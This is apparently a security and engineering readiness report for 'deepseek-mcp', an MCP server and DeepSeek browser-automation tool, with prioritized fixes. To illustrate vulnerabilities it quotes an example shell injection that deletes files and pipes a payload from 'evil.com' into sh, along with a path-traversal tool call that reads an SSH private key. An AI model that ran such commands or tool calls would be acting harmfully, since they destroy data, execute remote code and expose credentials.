# Industry Readiness Report — deepseek-mcp

**Analyzed:** 2026-03-08
**Codebase:** `src/` (16 files, ~1,200 LOC)
**Current State:** Personal/experimental tool
**Target State:** Production-grade MCP server

---

## Executive Summary

The project is a clever two-mode system:
- **CLI mode** — Playwright automates DeepSeek's web UI, builds codebase context, sends queries, and applies AI-generated SEARCH/REPLACE patches to your files.
- **MCP server mode** — A JSON-RPC 2.0 server exposing 7 file-system/shell tools to Claude Desktop or Cursor.

The core ideas are solid. However, **it is not industry-ready** due to critical security vulnerabilities, zero test coverage, brittle browser scraping, and missing engineering fundamentals. This report documents every issue and provides a prioritized fix roadmap.

---

## Overall Score

| Category | Score | Status |
|---|---|---|
| Security | 2/10 | Critical gaps |
| Reliability | 4/10 | Fragile |
| Code Quality | 5/10 | Works but rough |
| Observability | 2/10 | Console.log only |
| Testing | 0/10 | No tests |
| Documentation | 3/10 | Partial |
| MCP Compliance | 6/10 | Core works |
| Scalability | 3/10 | Single-instance |

---

## 1. Critical Security Issues (Fix Before Any Deployment)

### 1.1 Unrestricted Shell Command Execution

**File:** `src/tools/execute-command.js:17`

```js
const child = spawn(cmd, [], { cwd: projectPath, shell: true, timeout });
```

`shell: true` enables full shell injection. Any MCP client (or rogue prompt injected into a file being read) can run:

```
cmd = "rm -rf / && curl evil.com/payload | sh"
```

**Fix:**
- Add a command allowlist (e.g., only `npm`, `npx`, `yarn`, `git`, `node`)
- Parse args separately: `spawn('npm', ['install'], { shell: false })`
- Validate `cmd` against the allowlist before executing
- Add a `dangerousMode` flag requiring explicit user opt-in

---

### 1.2 Path Traversal in File Tools

**Files:** `src/tools/read-file.js`, `src/tools/write-file.js`, `src/tools/apply-patch.js`

None of the file tools validate that the resolved path stays inside `projectPath`. An AI (or malicious MCP client) can call:

```json
{ "name": "read_file", "args": { "path": "../../.ssh/id_rsa" } }
```

**Fix — add to every file tool:**

```js
const full = path.resolve(projectPath, filePath);
if (!full.startsWith(path.resolve(projectPath) + path.sep)) {
  return { error: 'Path traversal attempt blocked' };
}
```

---

### 1.3 Browser Session Stored in Project Root

**File:** `src/deepseek-browser.js:5`

```js
const SESSION_PATH = path.join(__dirname, '../.session');
```

The `.session` directory contains Chromium cookies and auth tokens for your DeepSeek account. It sits in the project root and is at risk of being accidentally committed or exposed.

**Fix:**
- Move to `%APPDATA%/deepseek-mcp/session` (Windows) or `~/.local/share/deepseek-mcp/session`
- Add `.session` and `*.session` to `.gitignore`

---

### 1.4 Unvalidated Regex from User Input

**File:** `src/tools/search-code.js:12`

```js
const re = regex ? new RegExp(pattern, 'gm') : null;
```

A malformed regex (`(((` or ReDoS patterns like `(a+)+$`) will crash the server with an uncaught exception.

**Fix:**

```js
let re = null;
if (regex) {
  try { re = new RegExp(pattern, 'gm'); }
  catch (e) { return { error: `Invalid regex: ${e.message}` }; }
}
```

---

### 1.5 `console.log` Corrupts MCP stdout

**Multiple files**

`console.log` writes to stdout. In MCP mode, stdout is the JSON-RPC channel. Any log line breaks the protocol and causes the client to crash or silently drop responses.

Found in:
- `src/context-builder.js` — several `console.log` calls
- `src/response-parser.js` — `console.error`, `console.log`
- `src/fuzzy-search.js` — `console.warn`

**Fix:**
- Add a logging module with a `MCP_MODE` env var
- In MCP mode, redirect all logs to `process.stderr`
- Or use a logging library like `pino` with configurable transport

---

## 2. Reliability Issues

### 2.1 Brittle Browser Scraping

**File:** `src/deepseek-browser.js` + `src/selectors.config.js`

The entire CLI mode depends on DeepSeek's web UI CSS class names (`.ds-markdown`, `.ds-icon-button--outlined`, etc.). These change whenever DeepSeek updates their frontend — no warning, no versioning.

**Risk:** Any DeepSeek UI deploy silently breaks the tool for all users.

**Fix options:**
- **Short term:** Add a `--selector-check` flag that validates all selectors on startup and warns when they fail
- **Long term:** Use [DeepSeek's official API](https://platform.deepseek.com) instead of browser scraping — the API is stable, faster, cheaper, and doesn't require a logged-in browser session

---

### 2.2 5-Minute Busy-Polling Loop

**File:** `src/deepseek-browser.js:106-123`

```js
const deadline = Date.now() + 300000; // 5 min
while (Date.now() < deadline) {
  // poll every 1500ms
}
```

This is a CPU/battery-burning busy loop with no exponential backoff. It also ties up the Node.js event loop.

**Fix:**
- Use `page.waitForFunction()` with Playwright's built-in polling instead of a manual loop
- Add exponential backoff: start at 500ms, cap at 5s
- Make the timeout configurable via env var (`DEEPSEEK_TIMEOUT_MS`)

---

### 2.3 Fuzzy Match Can Apply Wrong Changes

**File:** `src/fuzzy-search.js:51`

```js
if (bestScore > 0.70 && bestIdx !== -1) {
  // apply at best match location
}
```

A 70% Jaccard similarity match can silently apply edits to the wrong location in a file with repetitive code. The user only sees a warning, not a diff.

**Fix:**
- Show a unified diff of what will change before applying fuzzy matches
- Require user confirmation for matches below 90%
- Log which strategy was used to a structured audit log

---

### 2.4 `undo-last.js` State Lost on Restart

**File:** `src/tools/undo-last.js:3`

```js
const lastOp = { backups: [] };
```

This is module-level in-memory state. If the MCP server restarts (crash, config reload), all undo history is gone. There is also no connection between CLI-mode undo and MCP-mode undo.

**Fix:**
- Persist backup metadata to a JSON file in a temp/state directory
- Include timestamp so stale backups can be auto-cleaned

---

### 2.5 Synchronous File I/O Blocks the Event Loop

**File:** `src/context-builder.js` — entire class

All file scanning and reading uses synchronous `fs` APIs (`readdirSync`, `readFileSync`, `statSync`). In MCP server mode, this blocks the event loop while serving other requests.

**Fix:**
- Convert to async `fs.promises` or use `glob` package with streaming
- At minimum, wrap the heavy scan in `setImmediate` chunks

---

## 3. Code Quality Issues

### 3.1 Empty Catch Blocks Swallow Errors Silently

Across the codebase, errors are silently discarded:

```js
// context-builder.js
try { const pkg = JSON.parse(...); } catch {}

// response-parser.js
try { fs.unlinkSync(fullPath); removed++; } catch { /* ignore */ }

// deepseek-browser.js
} catch {}
```

Silent failures make debugging impossible in production. You never know if a file failed to read, a backup failed to delete, or a selector lookup threw.

**Fix:**
- Log all caught errors at `debug` level at minimum
- Only swallow errors where the fallback behavior is explicitly documented in a comment

---

### 3.2 Mixed Language in Console Output

**File:** `src/deepseek-browser.js:68`

```js
console.log("👉 Browser mein login karo, phir Enter dabao terminal mein...");
```

Hindi text in an English codebase is a professional inconsistency. In a shared/open-source project, maintainers and users expect consistent language.

**Fix:** Standardize all user-facing strings to English. Consider i18n if multilingual support is a goal.

---

### 3.3 No Input Validation on MCP Tool Arguments

**File:** `src/mcp-server.js:67`

```js
const data = await callTool(name, args || {}, this.context);
```

`args` is passed directly to tool handlers with zero validation against the declared `inputSchema`. A missing required field like `path` causes an unhandled exception.

**Fix:**
- Validate `args` against each tool's `inputSchema` before calling the handler
- Use a lightweight JSON Schema validator (e.g., `ajv`)

---

### 3.4 Hard-Coded Magic Numbers

Scattered across the codebase:

| Value | Location | Issue |
|---|---|---|
| `80000` chars | `context-builder.js:32` | Context window limit not configurable |
| `100` KB | `context-builder.js:30` | File size limit not configurable |
| `12` files | `context-builder.js:210` | Max files per query not configurable |
| `300000` ms | `deepseek-browser.js:105` | Timeout not configurable |
| `0.70` | `fuzzy-search.js:51` | Fuzzy threshold not configurable |

**Fix:** Centralize all configuration in a `config.js` that reads from environment variables with documented defaults.

---

### 3.5 `package.json` Missing Critical Fields

```json
{
  "name": "deepseek-mcp",
  "version": "1.0.0",
  "dependencies": { "playwright": "^1.58.2" }
}
```

Missing:
- `"engines"` — Node.js version requirement
- `"license"` — required for npm publish and legal clarity
- `"author"` — attribution
- `"repository"` — for npm linking
- `"bin"` — to make `mcp-entry.js` a CLI command installable via `npm install -g`
- `devDependencies` — test runner, linter, etc.
- No `package-lock.json` committed — non-reproducible installs

---

## 4. Missing Engineering Fundamentals

### 4.1 Zero Test Coverage

There are no test files anywhere in the project. The fuzzy matching engine (`fuzzy-search.js`) — the most algorithmically complex part — has no unit tests.

**Minimum tests needed:**
- `fuzzy-search.js` — unit tests for all 5 strategies (exact, trim-end, full-trim, jaccard, large-hunk)
- `response-parser.js` — unit tests for SEARCH/REPLACE parsing, context request detection, continuation signals
- `mcp-server.js` — integration test simulating a JSON-RPC handshake and tool call

**Recommended stack:** Jest (zero-config, good for Node.js)

---

### 4.2 No `.gitignore`

The following should be in `.gitignore` but likely aren't:

```
node_modules/
.session/
logs/
*.bak.*
.env
```

Without this, a `git add .` can accidentally commit your DeepSeek session cookies, backup files, or log files containing your codebase.

---

### 4.3 No Linting or Formatting

No ESLint config, no Prettier config. Code style is inconsistent (mixed quote styles, inconsistent spacing).

**Recommended setup:**

```bash
npm install -D eslint prettier eslint-config-prettier
```

Add to `package.json`:
```json
"scripts": {
  "lint": "eslint src/",
  "format": "prettier --write src/"
}
```

---

### 4.4 No Structured Logging

All logging is via `console.log/error/warn` with emoji prefixes. This produces unstructured, un-queryable output. In production you need:
- Timestamps on every log line
- Log levels (debug, info, warn, error)
- Machine-readable format (JSON) for log aggregators

**Recommended:** `pino` (fast, low-overhead, JSON output)

---

### 4.5 No README.md

The project has `ALL_FILES.md` and `DeepMCP_Phase4_Guide.md` (an internal dev guide) but no user-facing README. A new user has no idea:
- What this project does
- How to install it
- How to run CLI mode vs MCP mode
- What the prerequisites are (Node.js version, Playwright install)
- How to configure it

---

### 4.6 No Environment Variable Support

Sensitive configuration (project paths, timeouts, API keys for future DeepSeek API mode) is hard-coded or passed as CLI args. There's no `.env` / `dotenv` support.

---

## 5. MCP Protocol Compliance Gaps

The MCP server (`src/mcp-server.js`) implements the core protocol correctly but is missing:

| Missing Feature | Impact |
|---|---|
| `resources/list` and `resources/read` methods | Can't expose project files as MCP resources |
| `prompts/list` method | Can't offer prompt templates to clients |
| `notifications/tools/list_changed` | Client never knows when tool list updates |
| Proper error code enum | Errors are all `-32603` (generic internal error) |
| Content type beyond `text` | Can't return images, structured data |
| Session/client tracking | Single shared context for all clients |

---

## 6. Scalability Limitations

| Limitation | Current | Industry Standard |
|---|---|---|
| Browser instances | 1 (shared) | Pool of N instances |
| Concurrent requests | 0 (sequential) | Async queue with concurrency limit |
| Context window | 80K chars hardcoded | Configurable, with chunking |
| State management | In-memory | Persistent (Redis/SQLite) |
| Deployment | Manual node process | Docker container with health check |

---

## 7. Prioritized Fix Roadmap

### Phase A — Security (Do This First, Non-Negotiable)

| Priority | Task | Effort |
|---|---|---|
| P0 | Path traversal guard in all file tools | 1 hour |
| P0 | Command allowlist in `execute-command` | 2 hours |
| P0 | Move `.session` out of project root | 30 min |
| P0 | Fix regex crash in `search-code` | 15 min |
| P0 | Redirect all logs to stderr in MCP mode | 1 hour |

### Phase B — Reliability

| Priority | Task | Effort |
|---|---|---|
| P1 | Add JSON Schema validation for MCP tool args | 2 hours |
| P1 | Replace busy-poll loop with Playwright `waitForFunction` | 2 hours |
| P1 | Persist undo state to disk | 2 hours |
| P1 | Add selector health-check on startup | 1 hour |
| P2 | Convert synchronous file I/O to async | 3 hours |

### Phase C — Code Quality & DX

| Priority | Task | Effort |
|---|---|---|
| P1 | Write unit tests for fuzzy-search + response-parser | 4 hours |
| P1 | Add `.gitignore` | 15 min |
| P1 | Write README.md | 2 hours |
| P2 | Add ESLint + Prettier | 1 hour |
| P2 | Centralize all magic numbers in `config.js` | 1 hour |
| P2 | Replace console.log with structured logging (pino) | 3 hours |
| P3 | Standardize all strings to English | 30 min |

### Phase D — Architecture (Long Term)

| Priority | Task | Effort |
|---|---|---|
| P2 | Migrate from browser scraping to DeepSeek API | 1-2 days |
| P2 | Add `resources` and `prompts` MCP methods | 1 day |
| P3 | Add Docker support + health endpoint | 1 day |
| P3 | Add concurrent request queue | 2 days |

---

## 8. Quick Wins (Under 2 Hours Total)

These fixes have high impact and low effort — do them today:

```bash
# 1. Create .gitignore
cat > .gitignore << 'EOF'
node_modules/
.session/
logs/
*.bak.*
.env
EOF

# 2. Fix package.json
# Add: "engines": { "node": ">=18" }, "license": "MIT"

# 3. Fix regex crash (search-code.js line 12)
# Wrap in try/catch (see section 1.4)

# 4. Fix path traversal (all file tools)
# Add bounds check (see section 1.2)
```

---

## 9. Dependency Audit

| Current | Version | Issue |
|---|---|---|
| `playwright` | `^1.58.2` | Only dependency — very heavy (~100MB) for an MCP server that doesn't need browser in MCP mode |

**Recommendations:**
- Move `playwright` to `optionalDependencies` — MCP mode doesn't need it
- Add `ajv` for JSON Schema validation
- Add `pino` for structured logging
- Add `jest` as devDependency for testing
- Consider `zod` for runtime type validation of tool args

---

## 10. Positive Highlights (What's Already Good)

- **Dual-mode architecture** — CLI and MCP coexist cleanly without breaking each other
- **Fuzzy matching** — 5-strategy approach is genuinely clever and solves a real problem
- **Context-aware file selection** — keyword scoring + forced pinning is smart
- **CRLF normalization** — handles Windows line endings correctly
- **Backup-before-apply** — good default for safety
- **Continuation signal detection** — handles multi-part AI responses well
- **`selectors.config.js`** — externalizing selectors is the right pattern
- **MCP protocol version** — `2024-11-05` is correct and current

---

## Conclusion

The project demonstrates strong product thinking and working code. The two-mode design (CLI + MCP), fuzzy patch engine, and smart context selection are genuine innovations. However, **the security issues (path traversal + unrestricted shell execution) make this unsafe to expose to any client — including Claude Desktop — without fixes**.

**Recommended order:**
1. Fix the 5 P0 security items (half a day)
2. Add tests for the core parser and fuzzy engine (one day)
3. Write a proper README (half a day)
4. Then iterate on reliability and scalability

After Phase A+B fixes, this project would be genuinely usable and shareable as an open-source tool.
